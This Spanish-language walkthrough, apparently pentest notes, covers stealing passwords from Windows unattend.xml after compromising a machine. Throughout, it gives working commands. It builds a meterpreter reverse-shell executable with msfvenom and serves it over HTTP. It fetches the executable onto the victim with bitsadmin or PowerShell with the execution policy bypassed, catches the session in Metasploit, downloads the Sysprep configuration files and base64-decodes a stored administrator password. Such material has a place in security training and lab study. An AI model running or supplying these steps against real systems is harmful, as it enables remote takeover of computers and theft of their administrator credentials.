# 🔍 Searching for Passwords in Windows Configuration Files (unattend.xml)

---

## 🧠 Objetivo
Extraer contraseñas almacenadas en archivos de configuración de Windows (`unattend.xml`) a través de una sesión `meterpreter`, después de comprometer el equipo con un payload personalizado.

---

## 🧰 Requisitos
- Acceso a una máquina atacante con Kali Linux.
- Acceso inicial a una máquina víctima con Windows.
- `msfvenom`, `msfconsole`, servidor HTTP (Python), sesión `meterpreter`.

---

## ⚙️ Paso 1: Crear el payload malicioso

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<tu_IP> LPORT=<puerto> -f exe > payload.exe
```

- `-p` → payload meterpreter para Windows x64.
- `LHOST` y `LPORT` → IP y puerto del atacante.
- `-f exe` → formato ejecutable para Windows.

---

## 📡 Paso 2: Servir el payload con Python

```bash
python3 -m http.server 80
```

- Sirve `payload.exe` desde el directorio actual a través de HTTP.

---

## 💻 Paso 3: Descargar el payload desde la máquina víctima

```cmd
bitsadmin /transfer payload /download /priority high http://<tu_IP>/payload.exe C:\Windows\Temp\payload.exe
```

O (más moderno y estable):

```cmd
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://<tu_IP>/payload.exe -OutFile C:\Windows\Temp\payload.exe"
```

---

## 🚀 Paso 4: Lanzar Metasploit y configurar el handler

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <tu_IP>
set LPORT <puerto>
set ExitOnSession false
exploit -j
```

- Deja el handler escuchando para recibir la conexión reversa.

---

## 🧨 Paso 5: Ejecutar el payload desde la víctima

```cmd
C:\Windows\Temp\payload.exe
```

Una vez ejecutado, recibirás una sesión en Metasploit.

---

## 🛰️ Paso 6: Buscar archivos de configuración en la víctima

Desde la sesión `meterpreter`:

```bash
cd C:\\Windows\\Panther
ls
```

Busca el archivo:
```bash
download unattend.xml /root/Desktop/
```

O en otras rutas:
```bash
cd C:\\Windows\\System32\\Sysprep
cd C:\\Windows\\Panther\\UnattendGC
```

---

## 🔍 Paso 7: Leer y decodificar la contraseña (Base64)

Abre el archivo `unattend.xml` descargado y localiza la línea:

```xml
<Password>
  <Value>QWRtaW5AMTIz</Value>
  <PlainText>false</PlainText>
</Password>
```

Decodifica en Linux:

```bash
echo 'QWRtaW5AMTIz' | base64 -d
```

Resultado:
```
Admin@123
```

O en PowerShell:

```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5AMTIz"))
```

---

## ✅ Notas importantes

- `unattend.xml` se usa en despliegues automatizados de Windows (Sysprep) y **suele contener contraseñas en texto claro o Base64**.
- También revisa: `sysprep.xml`, `autounattend.xml`, o cualquier `.xml` en `C:\Windows\Panther\` y `C:\Windows\System32\Sysprep`.
- El hecho de que `PlainText=false` no significa que esté cifrado, sólo codificado (trivial de recuperar).

---

